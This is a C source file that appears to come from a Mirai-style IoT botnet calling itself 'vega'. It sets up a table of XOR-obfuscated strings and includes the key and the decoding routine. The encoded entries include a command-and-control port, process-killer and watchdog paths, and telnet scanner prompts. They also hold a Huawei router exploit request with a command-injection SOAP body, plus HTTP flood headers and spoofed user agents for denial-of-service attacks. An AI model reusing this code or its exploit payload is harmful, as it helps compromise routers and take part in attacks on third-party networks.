#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xF10AC36D;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{   
        /* exec or nah*/ 
    add_entry(TABLE_EXEC_SUCCESS, "\x03\x30\x32\x34\x06\x30\x36\x78\x1E\x14\x01\x14\x1B\x14\x65\x65\x64\x55", 18);
    add_entry(TABLE_INSTANCE_EXISTS, "\x02\x30\x75\x32\x3A\x21\x75\x21\x3D\x3C\x26\x75\x26\x3D\x3C\x21\x75\x34\x39\x27\x30\x34\x31\x2C\x7B\x55", 26);
        /* connections shit */
    add_entry(TABLE_CNC_PORT, "\xAD\xC8", 2); // 63645
    add_entry(TABLE_SCAN_CB_PORT, "\x97\xD9", 2); // 49804
        /* killer */
    add_entry(TABLE_KILLER_PROC, "\x7A\x25\x27\x3A\x36\x7A\x55", 7);
    add_entry(TABLE_KILLER_EXE, "\x7A\x30\x2D\x30\x55", 5);
    add_entry(TABLE_KILLER_FD, "\x7A\x33\x31\x55", 4);
    add_entry(TABLE_KILLER_MAPS, "\x7A\x38\x34\x25\x26\x55", 6);
    add_entry(TABLE_KILLER_TCP, "\x7A\x25\x27\x3A\x36\x7A\x3B\x30\x21\x7A\x21\x36\x25\x55", 14);
        /* memorykiller!! */
    add_entry(TABLE_MEM_1, "\x00\x05\x0D\x74\x55", 5);
    add_entry(TABLE_MEM_2, "\x26\x2C\x26\x20\x25\x31\x34\x21\x30\x27\x55", 11);
    add_entry(TABLE_MEM_3, "\x16\x3A\x3B\x3B\x30\x36\x21\x3C\x3A\x3B\x6F\x75\x3E\x30\x30\x25\x78\x34\x39\x3C\x23\x30\x55", 23);
    add_entry(TABLE_MEM_4, "\x34\x26\x26\x22\x3A\x27\x31\x55", 8);
    add_entry(TABLE_MEM_5, "\x70\x31\x7B\x70\x31\x7B\x70\x31\x7B\x70\x31\x55", 12);
    add_entry(TABLE_MEM_6, "\x16\x3A\x3A\x3E\x3C\x30\x6F\x55", 8);
    add_entry(TABLE_MEM_7, "\x25\x34\x3B\x31\x3A\x27\x34\x55", 8);
    add_entry(TABLE_MEM_8, "\x18\x30\x27\x36\x20\x27\x2C\x55", 8);
    add_entry(TABLE_MEM_9, "\x36\x27\x26\x33\x3C\x55", 6);
    add_entry(TABLE_MEM_10, "\x34\x3D\x26\x3A\x3E\x55", 6);
    add_entry(TABLE_MEM_11, "\x07\x3A\x3A\x21\x30\x31\x55", 7);
    add_entry(TABLE_MEM_12, "\x16\x3A\x27\x3A\x3B\x34\x55", 7);
    add_entry(TABLE_MEM_13, "\x39\x3A\x39\x3C\x32\x34\x3B\x32\x55", 9);
    add_entry(TABLE_MEM_14, "\x39\x3A\x39\x2D\x31\x55", 6);
    add_entry(TABLE_MEM_15, "\x2D\x31\x55", 3);
    add_entry(TABLE_MEM_16, "\x1B\x3C\x12\x12\x30\x07\x63\x6C\x2D\x31\x55", 11);
    add_entry(TABLE_MEM_17, "\x3B\x20\x36\x39\x30\x34\x27\x55", 8);
    add_entry(TABLE_MEM_18, "\x31\x23\x27\x1D\x30\x39\x25\x30\x27\x55", 10);
    add_entry(TABLE_MEM_19, "\x2C\x34\x3E\x20\x2F\x34\x55", 7);
    add_entry(TABLE_MEM_20, "\x3D\x3A\x3D\x3A\x55", 5);
    add_entry(TABLE_MEM_21, "\x1D\x3C\x39\x3C\x2D\x55", 6);
    add_entry(TABLE_MEM_22, "\x07\x30\x34\x25\x30\x27\x7B\x55", 8);
    add_entry(TABLE_MEM_23, "\x25\x20\x26\x26\x2C\x33\x34\x27\x21\x39\x38\x34\x3A\x3F\x3E\x55", 16);
    add_entry(TABLE_MEM_24, "\x14\x39\x30\x2D\x55", 5);
    add_entry(TABLE_MEM_25, "\x26\x3A\x27\x34\x55", 5);
    add_entry(TABLE_MEM_26, "\x18\x11\x18\x14\x55", 5);
    add_entry(TABLE_MEM_27, "\x27\x2F\x27\x55", 4);
    add_entry(TABLE_MEM_28, "\x3B\x2C\x34\x55", 4);
    add_entry(TABLE_MEM_29, "\x38\x30\x2F\x2C\x55", 5);
    add_entry(TABLE_MEM_30, "\x3D\x3C\x3E\x34\x27\x3C\x22\x34\x26\x3D\x30\x27\x30\x55", 14);
    add_entry(TABLE_MEM_31, "\x2F\x3D\x27\x55", 4);
    add_entry(TABLE_MEM_32, "\x39\x2F\x27\x31\x55", 5);
    add_entry(TABLE_MEM_33, "\x12\x20\x38\x38\x2C\x55", 6);
    add_entry(TABLE_MEM_34, "\x18\x3A\x2F\x3C\x55", 5);
    add_entry(TABLE_MEM_35, "\x34\x27\x38\x55", 4);
    add_entry(TABLE_MEM_36, "\x2D\x6D\x63\x0A\x63\x61\x55", 7);
    add_entry(TABLE_MEM_37, "\x2D\x6D\x63\x55", 4);
    add_entry(TABLE_MEM_38, "\x26\x3D\x61\x55", 4);
    add_entry(TABLE_MEM_39, "\x38\x3C\x25\x26\x55", 5);
    add_entry(TABLE_MEM_40, "\x38\x25\x26\x39\x55", 5);
            /* watchdog */
    add_entry(TABLE_MISC_WATCHDOG_1, "\x7A\x31\x30\x23\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 14);
    add_entry(TABLE_MISC_WATCHDOG_2, "\x7A\x31\x30\x23\x7A\x38\x3C\x26\x36\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 19);
    add_entry(TABLE_MISC_WATCHDOG_3, "\x7A\x26\x37\x3C\x3B\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 15);
    add_entry(TABLE_MISC_WATCHDOG_4, "\x7A\x37\x3C\x3B\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 14);
    add_entry(TABLE_MISC_WATCHDOG_5, "\x7A\x31\x30\x23\x7A\x13\x01\x02\x11\x01\x64\x65\x64\x0A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 23);
    add_entry(TABLE_MISC_WATCHDOG_6, "\x7A\x31\x30\x23\x7A\x13\x01\x02\x11\x01\x64\x65\x64\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 23);
    add_entry(TABLE_MISC_WATCHDOG_7, "\x7A\x31\x30\x23\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x65\x55", 15);
    add_entry(TABLE_MISC_WATCHDOG_8, "\x7A\x30\x21\x36\x7A\x31\x30\x33\x34\x20\x39\x21\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 22);
    add_entry(TABLE_MISC_WATCHDOG_9, "\x7A\x30\x21\x36\x7A\x22\x34\x21\x36\x3D\x31\x3A\x32\x55", 14);
            /* scanner */
    add_entry(TABLE_SCAN_SHELL, "\x26\x3D\x30\x39\x39\x55", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x30\x3B\x34\x37\x39\x30\x55", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x26\x2C\x26\x21\x30\x38\x55", 7);
    add_entry(TABLE_SCAN_SH, "\x26\x3D\x55", 3);
    add_entry(TABLE_SCAN_QUERY, "\x7A\x37\x3C\x3B\x7A\x37\x20\x26\x2C\x37\x3A\x2D\x75\x1E\x01\x1B\x64\x55", 18);
    add_entry(TABLE_SCAN_RESP, "\x1E\x01\x1B\x64\x6F\x75\x34\x25\x25\x39\x30\x21\x75\x3B\x3A\x21\x75\x33\x3A\x20\x3B\x31\x55", 23);
    add_entry(TABLE_SCAN_NCORRECT, "\x3B\x36\x3A\x27\x27\x30\x36\x21\x55", 9);
    add_entry(TABLE_SCAN_ASSWORD, "\x3A\x32\x3C\x3B\x55", 5);
    add_entry(TABLE_SCAN_OGIN, "\x34\x26\x26\x22\x3A\x27\x31\x55", 8);
    add_entry(TABLE_SCAN_ENTER, "\x30\x3B\x21\x30\x27\x55", 6);
    add_entry(TABLE_SCAN_POST, "\x05\x1A\x06\x01\x75\x7A\x36\x21\x27\x39\x21\x7A\x11\x30\x23\x3C\x36\x30\x00\x25\x32\x27\x34\x31\x30\x0A\x64\x75\x1D\x01\x01\x05\x7A\x64\x7B\x64\x55", 37);
    add_entry(TABLE_SCAN_CONTENTLEN, "\x16\x3A\x3B\x21\x30\x3B\x21\x78\x19\x30\x3B\x32\x21\x3D\x6F\x75\x61\x66\x65\x55", 20);
    add_entry(TABLE_SCAN_CONNECTION, "\x16\x3A\x3B\x3B\x30\x36\x21\x3C\x3A\x3B\x6F\x75\x3E\x30\x30\x25\x78\x34\x39\x3C\x23\x30\x55", 23);
    add_entry(TABLE_SCAN_ACCEPT, "\x14\x36\x36\x30\x25\x21\x6F\x75\x7F\x7A\x7F\x55", 12);
    add_entry(TABLE_SCAN_AUTH, "\x14\x20\x21\x3D\x3A\x27\x3C\x2F\x34\x21\x3C\x3A\x3B\x6F\x75\x11\x3C\x32\x30\x26\x21\x75\x20\x26\x30\x27\x3B\x34\x38\x30\x68\x77\x31\x26\x39\x33\x78\x36\x3A\x3B\x33\x3C\x32\x77\x79\x75\x27\x30\x34\x39\x38\x68\x77\x1D\x20\x34\x22\x30\x3C\x1D\x3A\x38\x30\x12\x34\x21\x30\x22\x34\x2C\x77\x79\x75\x3B\x3A\x3B\x36\x30\x68\x77\x6D\x6D\x63\x61\x60\x36\x30\x33\x37\x64\x33\x6C\x30\x31\x30\x65\x30\x66\x66\x63\x30\x66\x60\x63\x6C\x31\x62\x60\x30\x30\x66\x65\x77\x79\x75\x20\x27\x3C\x68\x77\x7A\x36\x21\x27\x39\x21\x7A\x11\x30\x23\x3C\x36\x30\x00\x25\x32\x27\x34\x31\x30\x0A\x64\x77\x79\x75\x27\x30\x26\x25\x3A\x3B\x26\x30\x68\x77\x66\x63\x64\x67\x33\x6D\x61\x66\x34\x61\x67\x31\x37\x66\x6D\x33\x61\x6D\x33\x60\x6C\x31\x67\x34\x66\x60\x6C\x62\x30\x64\x6C\x36\x77\x79\x75\x34\x39\x32\x3A\x27\x3C\x21\x3D\x38\x68\x77\x18\x11\x60\x77\x79\x75\x24\x3A\x25\x68\x77\x34\x20\x21\x3D\x77\x79\x75\x3B\x36\x68\x65\x65\x65\x65\x65\x65\x65\x64\x79\x75\x36\x3B\x3A\x3B\x36\x30\x68\x77\x67\x61\x6D\x31\x64\x34\x67\x60\x63\x65\x64\x65\x65\x63\x63\x6C\x77\x55", 258);
    add_entry(TABLE_SCAN_HEADER, "\x69\x6A\x2D\x38\x39\x75\x23\x30\x27\x26\x3C\x3A\x3B\x68\x77\x64\x7B\x65\x77\x75\x6A\x6B\x69\x26\x6F\x10\x3B\x23\x30\x39\x3A\x25\x30\x75\x2D\x38\x39\x3B\x26\x6F\x26\x68\x77\x3D\x21\x21\x25\x6F\x7A\x7A\x26\x36\x3D\x30\x38\x34\x26\x7B\x2D\x38\x39\x26\x3A\x34\x25\x7B\x3A\x27\x32\x7A\x26\x3A\x34\x25\x7A\x30\x3B\x23\x30\x39\x3A\x25\x30\x7A\x77\x75\x26\x6F\x30\x3B\x36\x3A\x31\x3C\x3B\x32\x06\x21\x2C\x39\x30\x68\x77\x3D\x21\x21\x25\x6F\x7A\x7A\x26\x36\x3D\x30\x38\x34\x26\x7B\x2D\x38\x39\x26\x3A\x34\x25\x7B\x3A\x27\x32\x7A\x26\x3A\x34\x25\x7A\x30\x3B\x36\x3A\x31\x3C\x3B\x32\x7A\x77\x6B\x69\x26\x6F\x17\x3A\x31\x2C\x6B\x69\x20\x6F\x00\x25\x32\x27\x34\x31\x30\x75\x2D\x38\x39\x3B\x26\x6F\x20\x68\x77\x20\x27\x3B\x6F\x26\x36\x3D\x30\x38\x34\x26\x78\x20\x25\x3B\x25\x78\x3A\x27\x32\x6F\x26\x30\x27\x23\x3C\x36\x30\x6F\x02\x14\x1B\x05\x05\x05\x16\x3A\x3B\x3B\x30\x36\x21\x3C\x3A\x3B\x6F\x64\x77\x6B\x69\x1B\x30\x22\x06\x21\x34\x21\x20\x26\x00\x07\x19\x6B\x55", 238);
    add_entry(TABLE_SCAN_HEADER2, "\x69\x7A\x1B\x30\x22\x06\x21\x34\x21\x20\x26\x00\x07\x19\x6B\x69\x1B\x30\x22\x11\x3A\x22\x3B\x39\x3A\x34\x31\x00\x07\x19\x6B\x71\x7D\x30\x36\x3D\x3A\x75\x1D\x00\x14\x02\x10\x1C\x00\x05\x1B\x05\x7C\x69\x7A\x1B\x30\x22\x11\x3A\x22\x3B\x39\x3A\x34\x31\x00\x07\x19\x6B\x69\x7A\x20\x6F\x00\x25\x32\x27\x34\x31\x30\x6B\x69\x7A\x26\x6F\x17\x3A\x31\x2C\x6B\x69\x7A\x26\x6F\x10\x3B\x23\x30\x39\x3A\x25\x30\x6B\x55", 101);

        /* attack */
    add_entry(TABLE_ATK_VSE, "\x01\x06\x3A\x20\x27\x36\x30\x75\x10\x3B\x32\x3C\x3B\x30\x75\x04\x20\x30\x27\x2C\x55", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x7A\x30\x21\x36\x7A\x27\x30\x26\x3A\x39\x23\x7B\x36\x3A\x3B\x33\x55", 17);    
    add_entry(TABLE_ATK_NSERV, "\x3B\x34\x38\x30\x26\x30\x27\x23\x30\x27\x55", 11);    
    add_entry(TABLE_ATK_KEEP_ALIVE, "\x16\x3A\x3B\x3B\x30\x36\x21\x3C\x3A\x3B\x6F\x75\x3E\x30\x30\x25\x78\x34\x39\x3C\x23\x30\x55", 23);
    add_entry(TABLE_ATK_ACCEPT, "\x14\x36\x36\x30\x25\x21\x6F\x75\x21\x30\x2D\x21\x7A\x3D\x21\x38\x39\x79\x34\x25\x25\x39\x3C\x36\x34\x21\x3C\x3A\x3B\x7A\x2D\x3D\x21\x38\x39\x7E\x2D\x38\x39\x79\x34\x25\x25\x39\x3C\x36\x34\x21\x3C\x3A\x3B\x7A\x2D\x38\x39\x6E\x24\x68\x65\x7B\x6C\x79\x3C\x38\x34\x32\x30\x7A\x22\x30\x37\x25\x79\x7F\x7A\x7F\x6E\x24\x68\x65\x7B\x6D\x55", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x14\x36\x36\x30\x25\x21\x78\x19\x34\x3B\x32\x20\x34\x32\x30\x6F\x75\x30\x3B\x78\x00\x06\x79\x30\x3B\x6E\x24\x68\x65\x7B\x6D\x55", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x16\x3A\x3B\x21\x30\x3B\x21\x78\x01\x2C\x25\x30\x6F\x75\x34\x25\x25\x39\x3C\x36\x34\x21\x3C\x3A\x3B\x7A\x2D\x78\x22\x22\x22\x78\x33\x3A\x27\x38\x78\x20\x27\x39\x30\x3B\x36\x3A\x31\x30\x31\x55", 48); 
    add_entry(TABLE_ATK_SET_COOKIE, "\x26\x30\x21\x16\x3A\x3A\x3E\x3C\x30\x7D\x72\x55", 12); 
    add_entry(TABLE_ATK_REFRESH_HDR, "\x27\x30\x33\x27\x30\x26\x3D\x6F\x55", 9);    
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x39\x3A\x36\x34\x21\x3C\x3A\x3B\x6F\x55", 10);    
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x26\x30\x21\x78\x36\x3A\x3A\x3E\x3C\x30\x6F\x55", 12);    
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x36\x3A\x3B\x21\x30\x3B\x21\x78\x39\x30\x3B\x32\x21\x3D\x6F\x55", 16);    
    add_entry(TABLE_ATK_CHUNKED, "\x21\x27\x34\x3B\x26\x33\x30\x27\x78\x30\x3B\x36\x3A\x31\x3C\x3B\x32\x6F\x55", 19);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x36\x3D\x20\x3B\x3E\x30\x31\x55", 8);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x3E\x30\x30\x25\x78\x34\x39\x3C\x23\x30\x55", 11);
    add_entry(TABLE_ATK_DOSARREST, "\x36\x3A\x3B\x3B\x30\x36\x21\x3C\x3A\x3B\x6F\x55", 12);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x26\x30\x27\x23\x30\x27\x6F\x75\x31\x3A\x26\x34\x27\x27\x30\x26\x21\x55", 18);
    add_entry(TABLE_ATK_HTTP, "\x26\x30\x27\x23\x30\x27\x6F\x75\x36\x39\x3A\x20\x31\x33\x39\x34\x27\x30\x78\x3B\x32\x3C\x3B\x2D\x55", 25);
    add_entry(TABLE_ATK_USERAGENT, "\x1D\x01\x01\x05\x7A\x64\x7B\x64\x55", 9);
    add_entry(TABLE_ATK_HOST, "\x00\x26\x30\x27\x78\x14\x32\x30\x3B\x21\x6F\x55", 12);
    add_entry(TABLE_ATK_COOKIE, "\x1D\x3A\x26\x21\x6F\x55", 6); 
    add_entry(TABLE_ATK_VSE, "\x16\x3A\x3A\x3E\x3C\x30\x6F\x55", 8);    
    add_entry(TABLE_ATK_SEARCHHTTP, "\x3D\x21\x21\x25\x55", 5);    
    add_entry(TABLE_ATK_URL, "\x20\x27\x39\x68\x55", 5);    
    add_entry(TABLE_ATK_POST, "\x05\x1A\x06\x01\x55", 5);    
        /* UA */
    add_entry(TABLE_HTTP_1, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x64\x65\x7B\x65\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x62\x61\x7B\x65\x7B\x66\x62\x67\x6C\x7B\x64\x66\x64\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 116);
    add_entry(TABLE_HTTP_2, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x64\x65\x7B\x65\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x62\x61\x7B\x65\x7B\x66\x62\x67\x6C\x7B\x64\x63\x6C\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 116);
    add_entry(TABLE_HTTP_3, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x64\x65\x7B\x65\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x6E\x75\x27\x23\x6F\x63\x63\x7B\x65\x7C\x75\x12\x30\x36\x3E\x3A\x7A\x67\x65\x64\x65\x65\x64\x65\x64\x75\x13\x3C\x27\x30\x33\x3A\x2D\x7A\x63\x63\x7B\x65\x77\x79\x55", 81);
    add_entry(TABLE_HTTP_4, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x64\x65\x7B\x65\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x62\x61\x7B\x65\x7B\x66\x62\x67\x6C\x7B\x64\x60\x62\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 116);
    add_entry(TABLE_HTTP_5, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x64\x65\x7B\x65\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x62\x66\x7B\x65\x7B\x66\x63\x6D\x66\x7B\x64\x65\x66\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 116);
    add_entry(TABLE_HTTP_6, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x18\x34\x36\x3C\x3B\x21\x3A\x26\x3D\x6E\x75\x1C\x3B\x21\x30\x39\x75\x18\x34\x36\x75\x1A\x06\x75\x0D\x75\x64\x65\x0A\x64\x61\x0A\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x63\x65\x60\x7B\x64\x7B\x64\x60\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x03\x30\x27\x26\x3C\x3A\x3B\x7A\x64\x67\x7B\x64\x75\x06\x34\x33\x34\x27\x3C\x7A\x63\x65\x60\x7B\x64\x7B\x64\x60\x55", 118);
    add_entry(TABLE_HTTP_7, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x63\x7B\x67\x6E\x75\x02\x1A\x02\x63\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x63\x6D\x7B\x65\x7B\x66\x61\x61\x65\x7B\x64\x65\x63\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 110);
    add_entry(TABLE_HTTP_8, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x18\x34\x36\x3C\x3B\x21\x3A\x26\x3D\x6E\x75\x1C\x3B\x21\x30\x39\x75\x18\x34\x36\x75\x1A\x06\x75\x0D\x75\x64\x65\x0A\x64\x61\x0A\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x62\x61\x7B\x65\x7B\x66\x62\x67\x6C\x7B\x64\x66\x64\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 122);
    add_entry(TABLE_HTTP_9, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x64\x65\x7B\x65\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x6E\x75\x27\x23\x6F\x63\x62\x7B\x65\x7C\x75\x12\x30\x36\x3E\x3A\x7A\x67\x65\x64\x65\x65\x64\x65\x64\x75\x13\x3C\x27\x30\x33\x3A\x2D\x7A\x63\x62\x7B\x65\x55", 79);
    add_entry(TABLE_HTTP_10, "\x18\x3A\x2F\x3C\x39\x39\x34\x7A\x60\x7B\x65\x75\x7D\x02\x3C\x3B\x31\x3A\x22\x26\x75\x1B\x01\x75\x63\x7B\x64\x6E\x75\x02\x3C\x3B\x63\x61\x6E\x75\x2D\x63\x61\x7C\x75\x14\x25\x25\x39\x30\x02\x30\x37\x1E\x3C\x21\x7A\x60\x66\x62\x7B\x66\x63\x75\x7D\x1E\x1D\x01\x18\x19\x79\x75\x39\x3C\x3E\x30\x75\x12\x30\x36\x3E\x3A\x7C\x75\x16\x3D\x27\x3A\x38\x30\x7A\x62\x61\x7B\x65\x7B\x66\x62\x67\x6C\x7B\x64\x66\x64\x75\x06\x34\x33\x34\x27\x3C\x7A\x60\x66\x62\x7B\x66\x63\x55", 115);
    
    add_entry(TABLE_RANDOM, "\x34\x26\x31\x24\x22\x30\x27\x21\x2C\x20\x39\x3E\x3F\x33\x32\x3D\x25\x3A\x38\x3B\x37\x2F\x2D\x36\x23\x65\x64\x67\x66\x61\x60\x63\x62\x6D\x6C\x55", 36);
}


void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("(vega/table) tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("(vega/table) tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("(vega/table) tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
